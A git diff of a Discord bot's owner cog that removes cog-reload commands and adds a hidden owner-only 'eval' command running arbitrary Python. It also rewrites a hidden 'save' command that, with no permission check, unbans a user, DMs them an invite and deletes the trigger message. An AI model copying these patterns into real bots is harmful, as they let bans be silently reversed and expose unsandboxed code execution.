@@ -10,32 +10,6 @@ class Owner(commands.Cog):
 	async def test(self,ctx):
 		await ctx.reply("I'm connected! :D")
 
-	@commands.command(aliases=["load"], hidden=True)
-	@commands.is_owner()
-	async def load_cog(self, ctx, *, cog: str):
-		try:
-			self.bot.load_extension(cog)
-		except Exception as e:
-			await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}', delete_after=3.0)
-		else:
-			await ctx.send('**`SUCCESS`**', delete_after=3.0)
-
-	@commands.command(aliases=["unload"], hidden=True)
-	@commands.is_owner()
-	async def unload_cog(self, ctx, *, cog: str):
-		try:
-			self.bot.unload_extension(cog)
-		except Exception as e:
-			await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}', delete_after=3.0)
-		else:
-			await ctx.send('**`SUCCESS`**', delete_after=3.0)
-	
-	@commands.command(aliases=["reload"], hidden=True)
-	@commands.is_owner()
-	async def reload_cog(self, ctx, *, cog: str):
-		await self.unload_cog(self, ctx, cog)
-		await self.load_cog(self, ctx, cog)
-	
 	@commands.command(hidden=True)
 	@commands.guild_only()
 	@commands.is_owner()
@@ -130,10 +104,19 @@ class Owner(commands.Cog):
 	@commands.command(hidden=True)
 	@commands.guild_only()
 	async def save(self, ctx, user:discord.User):
-		await ctx.guild.unban(user)
-		invitelink = await discord.Guild.Channel.create_invite(max_uses=0,unique=True)
-		await user.send(invitelink)
+		try: await ctx.guild.unban(user)
+		except: pass
+
+		try: await user.send(await ctx.channel.create_invite())
+		except: pass
 		await ctx.message.delete()
+	
+	@commands.command(hidden=True)
+	@commands.is_owner()
+	async def eval(self, ctx, *, code):
+		result = eval(code)
+		await ctx.send(result)
+
 
 def setup(bot):
 	bot.add_cog(Owner(bot))
